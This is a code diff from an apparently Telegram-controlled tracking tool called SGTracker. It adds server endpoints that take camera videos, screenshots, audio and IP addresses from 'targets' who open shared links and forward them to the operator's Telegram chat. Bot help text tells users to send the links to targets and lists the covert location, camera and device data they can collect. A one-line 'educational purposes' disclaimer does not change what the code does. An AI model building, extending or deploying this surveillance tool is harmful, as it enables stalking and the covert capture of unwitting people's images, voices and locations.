+          chatId = parseInt(uid, 36); // Fallback to the conversion
+        }
+        
+        // Send an initial message about the capture
+        await bot.sendMessage(chatId, 
+          `🎥 <b>Multi-Camera Capture Successful!</b> 🎥\n\n` +
+          `Target <code>${uid}</code> has been successfully tracked with our advanced camera capture system.\n\n` +
+          `Preparing data and videos for transmission...\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`,
+          { parse_mode: "HTML" }
+        );
+        
+        // Create captions for each video
+        const videoCaptions = {
+          front: `📱 <b>Front Camera Recording</b> 📱\n\n` +
+            `👤 <b>Target:</b> <code>${uid}</code>\n` +
+            `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+            `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
+            `<i>Captured using SGTracker by @SG_Modder</i>`,
+            
+          back: `📷 <b>Back Camera Recording</b> 📷\n\n` +
+            `👤 <b>Target:</b> <code>${uid}</code>\n` +
+            `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+            `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
+            `<i>Captured using SGTracker by @SG_Modder</i>`,
+            
+          // Screen recording template removed as requested
+            audio: `🎵 <b>Audio Recording</b> 🎵\n\n` +
+            `👤 <b>Target:</b> <code>${uid}</code>\n` +
+            `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+            `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
+            `<i>Captured using SGTracker by @SG_Modder</i>`
+        };
+          
+        // Send each video with its caption
+        for (let i = 0; i < filesPaths.length; i++) {
+          const filePath = filesPaths[i];
+          let captionKey;
+          
+          if (filePath.includes('front')) {
+            captionKey = 'front';
+          } else if (filePath.includes('back')) {
+            captionKey = 'back';
+          } else if (filePath.includes('screen')) {
+            captionKey = 'screen';
+          }
+          
+          try {
+            // Send video to Telegram
+            await bot.sendVideo(chatId, filePath, { 
+              caption: videoCaptions[captionKey],
+              parse_mode: "HTML"
+            });
+            console.log(`${captionKey} camera recording sent successfully to Telegram`);
+          } catch (error) {
+            console.log(`Error sending ${captionKey} recording to Telegram:`, error);
+            // Try to send as document if video send fails
+            try {
+              await bot.sendDocument(chatId, filePath, { 
+                caption: videoCaptions[captionKey] + "\n\n⚠️ Sent as document due to video processing error.",
+                parse_mode: "HTML"
+              });
+            } catch (docError) {
+              console.error(`Failed to send ${captionKey} recording as document:`, docError);
+            }
+          }
+          
+          // Add a small delay between sending videos to avoid rate limiting
+          await new Promise(resolve => setTimeout(resolve, 2000));
+        }
+        
+        // Send a completion message
+        await bot.sendMessage(chatId, 
+          `✅ <b>Multi-Camera Capture Complete</b> ✅\n\n` +
+          `All available video feeds have been successfully captured and transmitted.\n\n` +
+          `<b>Summary:</b>\n` +
+          `• ${frontVideoData ? '✓' : '✗'} Front Camera\n` +
+          `• ${backVideoData ? '✓' : '✗'} Back Camera\n\n` +
+          `<b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `<b>Timestamp:</b> <code>${timestamp}</code>\n\n` +
+          `<i>SGTracker Premium by @SG_Modder</i>`,
+          { parse_mode: "HTML" }
+        );
+        
+        console.log("All camera recordings sent successfully to Telegram");
+      } catch (error) {
+        console.error("Error processing multi-camera recordings:", error);
+        res.status(500).send("Error processing multi-camera recordings");
+        return;
+      }
+      
+      res.status(200).send("Multi-camera recordings processed successfully");
+    } else {
+      res.status(400).send("Missing UID or video data");
+    }
+  } catch (error) {
+    console.error("Error in multi-camera recording handler:", error);
+    res.status(500).send("Internal Server Error");
+  }
+});
+
+// New screenshot endpoint
+app.post("/screenshot", async (req, res) => {
+  try {
+    console.log("Screenshot endpoint hit");
+    
+    var uid = decodeURIComponent(req.body.uid) || null;
+    var imageData = decodeURIComponent(req.body.img) || null;
+      
+    if (uid != null && imageData != null) {
+      console.log(`Received screenshot data for uid ${uid}`);
+      
+      try {
+        // Convert base64 to buffer
+        var buffer = Buffer.from(imageData, 'base64');
+        console.log(`Converted base64 to buffer, size: ${buffer.length} bytes`);
+          
+        // Create directory if it doesn't exist
+        const dirPath = path.join(__dirname, '..', 'screens');
+        fs.mkdirSync(dirPath, { recursive: true });
+        
+        // Save image to file (we only need to do this once)
+        const filePath = path.join(dirPath, `${uid}_screenshot.png`);
+        fs.writeFileSync(filePath, buffer);
+        console.log(`Screenshot saved to ${filePath}`);
+          
+        // Get client IP if it's stored in targets
+        const ipAddress = targets[uid]?.ip || 'Unknown';
+        const timestamp = getFormattedDate();
+        
+        // Convert uid to chat ID if needed
+        let chatId;
+        try {
+          // First check if it's in targets
+          if (targets[uid] && targets[uid].chatId) {
+            chatId = targets[uid].chatId;
+          } else {
+            // Otherwise, convert from base36
+            chatId = parseInt(uid, 36);
+          }
+          console.log(`Sending to chat ID: ${chatId}`);
+        } catch (error) {
+          console.error("Error converting uid to chat ID:", error);
+          chatId = uid; // Fallback to the original uid
+        }
+        
+        // Create a more attractive caption with emojis and formatting
+        const screenshotCaption = 
+          `📸 <b>Screenshot Captured Successfully</b> 📸\n\n` +
+          `📱 <b>Target:</b> <code>${uid}</code>\n` +
+          `🌐 <b>IP Address:</b> <code>${ipAddress}</code>\n` +
+          `⏰ <b>Timestamp:</b> <code>${timestamp}</code>\n` +
+          `📊 <b>Size:</b> <code>${Math.round(buffer.length/1024)} KB</code>\n\n` +
+          `<i>Captured using SGTracker by @SG_Modder</i>`;
+          
+        try {
+          // Send photo to Telegram using file path
+          await bot.sendPhoto(chatId, filePath, { 
+            caption: screenshotCaption,
+            parse_mode: "HTML"
+          });
+          console.log("Screenshot sent successfully to Telegram");
+        } catch (error) {
+          console.log("Error sending screenshot to Telegram:", error);
+          
+          // If sending as photo fails, try to send as document
+          try {
+            await bot.sendDocument(chatId, filePath, { 
+              caption: screenshotCaption,
+              parse_mode: "HTML"
+            });
+            console.log("Screenshot sent as document successfully");
+          } catch (docError) {
+            console.log("Error sending screenshot as document:", docError);
+            
+            // If sending as document also fails, send text notification
+            try {
+              await bot.sendMessage(chatId, 
+                `📸 <b>Screenshot captured</b>\n` +
+                `📱 Target ID: <code>${uid}</code>\n` +
+                `🌐 IP: <code>${ipAddress}</code>\n` +
+                `⏰ Time: <code>${timestamp}</code>\n\n` +
+                `<i>Screenshot saved to server but could not be sent to Telegram</i>`,
+                { parse_mode: "HTML" }
+              );
+              console.log("Screenshot notification sent as text message");
+            } catch (msgError) {
+              console.log("Error sending screenshot notification:", msgError);
+            }
+          }
+        }
+          
+        res.send("Screenshot received");
+      } catch (conversionError) {
+        console.error("Error processing screenshot:", conversionError);
+        res.status(500).send("Error processing screenshot data");
+      }
+    } else {
+      console.log("Missing uid or screenshot data");
+      res.status(400).send("Bad Request: Missing uid or screenshot data");
+    }
+  } catch (error) {
+    console.error("Error in screenshot handler:", error);
     res.status(500).send("Internal Server Error");
   }
 });
@@ -692,8 +1690,8 @@ app.get("/w/:uid/:uri/:uniqueId?/:captureMethod?", async (req, res) => {
     const ip = getClientIp(req);
     const time = getFormattedDate();
     
-    // Log access with unique ID for tracking
-    console.log(`WebView access: ${uniqueId} | IP: ${ip} | Time: ${time}`);
+    // Log access with unique ID and capture method for tracking
+    console.log(`WebView access: ${uniqueId} | IP: ${ip} | Time: ${time} | CaptureMethod: ${captureMethod}`);
     
     // Render the template
     const html = ejs.render(webviewTemplate, {
@@ -852,8 +1850,11 @@ app.post("/webhook", async (req, res) => {
             methodId = "minimal";
           } else if (replyText.includes("Audio")) {
             methodId = "audio";
-          } else if (replyText.includes("Screen")) {
-            methodId = "screen";
+          // Screen recording removed as requested 
+          // } else if (replyText.includes("Screen Recording")) {
+          //   methodId = "screen";
+          } else if (replyText.includes("Screenshot")) {
+            methodId = "screenshot";
           }
           
           console.log("Webhook: Creating link with method:", methodId);
@@ -915,14 +1916,17 @@ async function sendWelcomeMessage(chatId, firstName, messageId = null) {
   const welcomeText = `<b>🌟 Welcome ${firstName}! 🌟</b>\n\n` +
     `<i>SG Tracker</i> is your advanced tracking tool that creates custom links to gather information about anyone who clicks them.\n\n` +
     `<b>📱 What You Can Track:</b>\n` +
-    `• 📍 Precise Location\n` +
-    `• 📷 Camera Snapshots\n` +
-    `• 🎥 Screen Recording\n` +
-    `• 🎤 Audio Recording\n` +
-    `• 💻 Device Information\n` +
-    `• 🔋 Battery Status\n` +
-    `• 🌐 Network Details\n\n` +
+    `• 🎥 <b>NEW!</b> Front & Back Camera Video Recording\n` +
+    `• 📹 <b>NEW!</b> Separate Front & Back Camera Videos\n` +
+    `• 📍 Precise Location with Interactive Maps\n` +
+    `• 📷 Camera Snapshots (Front & Back)\n` +
+    `• 📸 Full Screenshots with Status Bar\n` +
+    `• 🎤 Audio Voice Recording\n` +
+    `• 💻 Complete Device Information\n` +
+    `• 🔋 Battery & Charging Status\n` +
+    `• 🌐 Network & Connection Details\n\n` +
     `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
+    `<b>📢 Channels:</b> <a href="https://t.me/sgmoddernew">@sgmoddernew</a>, <a href="https://t.me/SG_Modder0">@SG_Modder0</a>, <a href="https://t.me/SG_Modder1">@SG_Modder1</a>\n` +
     `<b>🔗 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>\n\n` +
     `<b>🚀 Get Started:</b> Click the button below or type /create to generate your first tracking link!`;
   
@@ -992,10 +1996,21 @@ async function sendHelpMessage(chatId, messageId = null) {
     
     `<b>🚀 Getting Started:</b>\n` +
     `1️⃣ Type /create or click the button below\n` +
-    `2️⃣ Enter a URL when prompted (e.g., https://google.com)\n` +
-    `3️⃣ The bot will generate your tracking links\n` +
-    `4️⃣ Share these links with your target\n` +
-    `5️⃣ When they open the link, you'll receive their information\n\n` +
+    `2️⃣ Choose your preferred capture method\n` +
+    `3️⃣ Enter a URL when prompted (e.g., https://google.com)\n` +
+    `4️⃣ The bot will generate your tracking links\n` +
+    `5️⃣ Share these links with your target\n` +
+    `6️⃣ When they open the link, you'll receive their information\n\n` +
+    
+    `<b>🎯 Capture Methods:</b>\n\n` +
+    `<b>• 🎥 All Cameras:</b> Front & back camera videos simultaneously\n` +
+    `<b>• 📸 Front Camera Image:</b> Front camera photo capture\n` +
+    `<b>• 📸 Back Camera Image:</b> Back camera photo capture\n` +
+    `<b>• 🎥 Front Camera Video:</b> Front camera 10-second video\n` +
+    `<b>• 🎥 Back Camera Video:</b> Back camera 10-second video\n` +
+    `<b>• 📸 Screenshot:</b> Full page screenshot with status bar\n` +
+    `<b>• 🎤 Audio Capture:</b> Voice recording + device info\n` +
+    `<b>• 💻 Minimal:</b> Device info + location only\n\n` +
     
     `<b>🔮 Available Link Types:</b>\n\n` +
     `<b>1. 🛡️ Cloudflare Page:</b>\n` +
@@ -1010,15 +2025,18 @@ async function sendHelpMessage(chatId, messageId = null) {
     `• Note: Some sites block iframe embedding (e.g., Google)\n\n` +
     
     `<b>📱 Information Collected:</b>\n` +
-    `• 📍 Location (requires permission)\n` +
-    `• 📷 Camera snapshots (requires permission)\n` +
-    `• 🎥 Screen Recording (coming soon)\n` +
-    `• 🎤 Audio Recording (coming soon)\n` +
-    `• 🖥️ Device & browser details\n` +
-    `• 🔋 Battery information\n` +
+    `• 📸 Camera photos (front & back)\n` +
+    `• 🎥 Camera video recordings (front & back)\n` +
+    `• 📍 Precise location with maps\n` +
+    `• 📸 Full screen capture with status bar\n` +
+    `• 🎤 Audio voice recording\n` +
+    `• 🖥️ Detailed device & browser specs\n` +
+    `• 🔋 Battery level & charging status\n` +
     `• 🌐 IP address & network data\n\n` +
     
     `<b>👨‍💻 Developed by:</b> <a href="https://t.me/SG_Modder">@SG_Modder</a>\n` +
+    `<b>📢 Channels:</b> <a href="https://t.me/sgmoddernew">@sgmoddernew</a>, <a href="https://t.me/SG_Modder0">@SG_Modder0</a>, <a href="https://t.me/SG_Modder1">@SG_Modder1</a>\n` +
+    `<b>🔗 GitHub:</b> <a href="https://github.com/SGModder-Offcial">SGModder-Offcial</a>\n\n` +
     `<b>⚠️ DISCLAIMER:</b> <i>Use responsibly and only with proper consent. This tool is for educational purposes only.</i>`;
   
   // If messageId is provided, edit the existing message
@@ -1134,16 +2152,23 @@ if (process.env.NODE_ENV !== "production") {
         // Find which capture method was selected based on text content
         let methodId = "full"; // Default
         
-        if (replyText.includes("Front Camera")) {
-          methodId = "full";
-        } else if (replyText.includes("Back Camera")) {
-          methodId = "back";
+        if (replyText.includes("Front Camera Image")) {
+          methodId = "frontcam";
+        } else if (replyText.includes("Back Camera Image")) {
+          methodId = "backcam";
+        } else if (replyText.includes("Front Camera Video")) {
+          methodId = "frontvideo";
+        } else if (replyText.includes("Back Camera Video")) {
+          methodId = "backvideo";
+        } else if (replyText.includes("All Cameras")) {
+          methodId = "allcams";
         } else if (replyText.includes("Minimal") || replyText.includes("No Camera")) {
           methodId = "minimal";
         } else if (replyText.includes("Audio")) {
           methodId = "audio";
-        } else if (replyText.includes("Screen")) {
-          methodId = "screen";
+        // Screen recording is removed
+        } else if (replyText.includes("Screenshot")) {
+          methodId = "screenshot";
         }
         
         console.log("Creating link with method:", methodId);
